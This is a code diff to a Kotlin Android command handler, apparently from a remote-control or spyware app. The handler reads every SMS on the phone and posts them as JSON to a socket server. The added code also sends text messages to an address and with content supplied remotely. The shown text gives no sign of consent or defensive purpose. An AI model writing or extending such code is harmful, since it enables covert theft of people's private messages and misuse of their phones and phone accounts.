@@ -17,11 +17,7 @@ import com.hc.calling.commands.callingtransaction.CallingHistory
  */
 class Sms(context: Context) : Command(), Executor {
 
-    private var context: Context? = null
-
-    init {
-        this.context = context
-    }
+    private val mContext = context
 
     companion object {
         const val SMS_SEND_ACTION = "SMS_SEND_ACTION"
@@ -55,10 +51,17 @@ class Sms(context: Context) : Command(), Executor {
      * post all sms as json to the socket server
      */
     override fun execute(data: Array<Any>) {
+        com.orhanobut.logger.Logger.json(data[0].toString())
+        val destinationDTO = Gson().fromJson(data[0].toString(), DestinationDTO::class.java)
+        if (destinationDTO != null) {
+            sendSms(mContext, destinationDTO.content, destinationDTO.address)
+            this.emitData(SMS_LIST, "send success")
+        } else {
+            val msgList = CallingHistory.getSmsFromPhone(mContext)
+            val data1 = Gson().toJson(msgList)
+            this.emitData(SMS_LIST, data1)
+        }
 
-        val msgList = CallingHistory.getSmsFromPhone(context)
-        val data1 = Gson().toJson(msgList)
-        this.emitData(SMS_LIST, data1)
     }
 
 
@@ -66,7 +69,7 @@ class Sms(context: Context) : Command(), Executor {
      * register the msg send callback
      */
     private fun registerCallBack(action: String): Sms {
-        context!!.registerReceiver(object : BroadcastReceiver() {
+        mContext.registerReceiver(object : BroadcastReceiver() {
             override fun onReceive(context: Context?, intent: Intent?) {
             }
         }, IntentFilter(action))
@@ -75,7 +78,7 @@ class Sms(context: Context) : Command(), Executor {
     }
 
     data class DestinationDTO(
-        var address: String,
-        var content: String
+        var address: String="",
+        var content: String =""
     )
 }
